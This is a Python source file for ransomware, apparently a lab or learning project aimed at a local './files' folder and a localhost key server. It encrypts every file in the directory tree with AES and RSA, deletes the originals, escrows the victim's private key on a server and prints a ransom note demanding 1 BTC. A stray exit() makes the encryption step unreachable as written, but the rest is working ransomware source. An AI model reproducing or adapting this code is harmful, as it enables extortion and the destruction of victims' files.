# Generate public and private key
# Save public key in a file
# Save encrypted private key in a file

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from pathlib import Path
import requests
import base64
import os
import shutil

SERVER_URL = 'http://127.0.0.1:5000'
DIRECTORY = os.getcwd() + '/files' 
CLIENT_PRIVATE_KEY_FILE_NAME = "privateKeyEnc.pem"

def generate_keys():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.public_key().export_key()
    return private_key, public_key

def get_server_public_key():
    response = requests.get(SERVER_URL + "/public-key")
    if response.status_code == 200:
        response_data = response.json()
        server_public_key = RSA.import_key(response_data['publicKey'])
    else:
        print(f"Error: Failed to get server's public key")
        exit()
    return server_public_key

def encrypt_client_private_key(server_public_key, client_private_key):
    chunk_size = 190  # maximum chunk size for PKCS1_OAEP with RSA 2048-bit key is 190 bytes
    cipher = PKCS1_OAEP.new(server_public_key)
    encrypted_chunks = []
    
    client_private_key_str = client_private_key.decode()
    chunk_size = 190

    # convert the client_private_key_str to bytes
    client_private_key_bytes = client_private_key_str.encode('utf-8')

    encrypted_chunks = []
    for i in range(0, len(client_private_key_bytes), chunk_size):
        chunk = client_private_key_bytes[i:i+chunk_size]
        encrypted_chunk = cipher.encrypt(chunk)
        encrypted_chunks.append(encrypted_chunk)

    # delete all the private key related variables so that it is not accessible later
    del client_private_key, client_private_key_bytes, client_private_key_str

    # concatenate the encrypted chunks to form the final ciphertext
    ciphertext = b''.join(encrypted_chunks)
    return base64.b64encode(ciphertext)

def decrypt_client_private_key(client_private_key_enc):
    response = requests.post(SERVER_URL + "/decrypt", json = {"private_key_enc": client_private_key_enc})
    if response.status_code == 200:
        response_data = response.json()
        client_private_key = response_data['private_key']    
    else:
        print(f"Error: Failed to get server's public key")
        exit()
    return client_private_key

def is_valid_reference_num(reference_num):
    return reference_num == "111"

def scan_recurse(base_dir):
    '''
    Scan a directory and return a list of all files
    return: list of files
    '''
    for entry in os.scandir(base_dir):
        if entry.is_file():
            yield entry
        else:
            yield from scan_recurse(entry.path)

def encrypt_files(file_path, public_key):
    '''
    Input: file path and public key
    Output: encrypted file with extension .enc and remove original file
    use EAX mode to allow detection of unauthorized modifications
    '''
    # read data from file
    file_path = str(file_path)
    with open(file_path, 'rb') as f:
        data = f.read()
    
    # convert data to bytes
    data = bytes(data)

    # create public key object
    public_key = RSA.import_key(public_key)
    session_key = os.urandom(16)

    # encrypt the session key with the public key
    cipher = PKCS1_OAEP.new(public_key)
    encrypted_session_key = cipher.encrypt(session_key)

    # encrypt the data with the sedecrypt()ssion key
    cipher = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    # save the encrypted data to file
    file_extension = '.enc'
    encrypted_file = file_path + file_extension
    with open(encrypted_file, 'wb') as f:
        [ f.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext) ]

    # delete the original file
    os.remove(file_path)

def decrypt_files(file_path, private_key):
    '''
    Input: file path and private key
    Output: decrypted files with encrypted files removed
    use EAX mode to allow detection of unauthorized modifications
    '''

    private_key = RSA.import_key(private_key)

    # read data from file
    with open(file_path, 'rb') as f:
        # read the session key
        encrypted_session_key, nonce, tag, ciphertext = [ f.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]

    # decrypt the session key
    cipher = PKCS1_OAEP.new(private_key)
    sessionKey = cipher.decrypt(encrypted_session_key)

    # decrypt the data with the session key
    cipher = AES.new(sessionKey, AES.MODE_EAX, nonce)
    data = cipher.decrypt_and_verify(ciphertext, tag)

    # save the decrypted data to file
    file_path=str(file_path)
    decrypted_file = '.'.join(file_path.split('.')[:-1])
    with open(decrypted_file, 'wb') as f:
        f.write(data)

    # delete the encrypted file
    os.remove(file_path)

def ransomware():
    text1 = "☠️☠️☠️☠️☠️☠️☠️☠️☠️"
    text2 = "\033[31mYOUR FILES ARE ENCRYPTED\033[0m"
    text3 = "All your files have been encrypted due to a security problem with your PC"
    text4 = "If you want to restore them, send 1 BTC to <random_BTC_address>"
    text5 = "\033[33mATTENTION\033[0m"
    text6 = ("☠️ Do not rename encrypted files.")
    text7 = ("☠️ Do not try to decrypt your data using third party software, it may cause permanent data loss.")

    # Get the width of the terminal window
    term_width, _ = shutil.get_terminal_size()

    # Center-align the text to the full width of the terminal window
    centered_text1 = text1.center(term_width)
    centered_text2 = text2.center(term_width)
    centered_text3 = text3.center(term_width)
    centered_text4 = text4.center(term_width)
    centered_text5 = text5.center(term_width)
    centered_text6 = text6.center(term_width)
    centered_text7 = text7.center(term_width)

    print("\n")
    print(centered_text1)
    print(centered_text2)
    print("\n")
    print(centered_text3)
    print(centered_text4)
    print("\n")
    print(centered_text5)
    print("\n")
    print(centered_text6)
    print(centered_text7)
    print("\n")

    exit()
    # generate client's private and public key if it is not already generated
    if not os.path.isfile(CLIENT_PRIVATE_KEY_FILE_NAME):
        client_private_key, client_public_key = generate_keys()

        # loop through the directory and encrypt all the files
        for item in scan_recurse(DIRECTORY): 
            file_path = Path(item)
            encrypt_files(file_path, client_public_key)
        print("Encrypted files successfully")

        # get server's public key
        server_public_key = get_server_public_key()

        # encrypt client's private key using server's public key
        client_private_key_enc = encrypt_client_private_key(server_public_key, client_private_key)

        # save encrypted data to file
        with open(CLIENT_PRIVATE_KEY_FILE_NAME, 'wb') as f:
            f.write(client_private_key_enc)

        print("\033[31mYou have been HACKED \033[0m")
    
    # verify ransom reference number
    reference_num = input("Enter payment reference number: ")
    if is_valid_reference_num(reference_num):
        # read the encrypted client's private key
        with open(CLIENT_PRIVATE_KEY_FILE_NAME, 'rb') as f:
            client_private_key_enc = f.read()

        # decrypt the encrypted client's private key
        client_private_key = decrypt_client_private_key(client_private_key_enc.decode())
        print("Called API and decrypted private key")

        # loop through the direrctory and decrypt files
        for item in scan_recurse(DIRECTORY): 
            file_path = Path(item)
            file_type = file_path.suffix.lower()
            if file_type == ".enc":
                decrypt_files(file_path, client_private_key)
            continue

        # delete the file containing client's encrypted private key
        os.remove(CLIENT_PRIVATE_KEY_FILE_NAME)
        red_text = "\033[31mThis text is red\033[0m"
        print(red_text)
        print("Decrypted files successfully")
    else:
        print("Invalid reference number")

    return
    
if __name__ == "__main__":
    ransomware()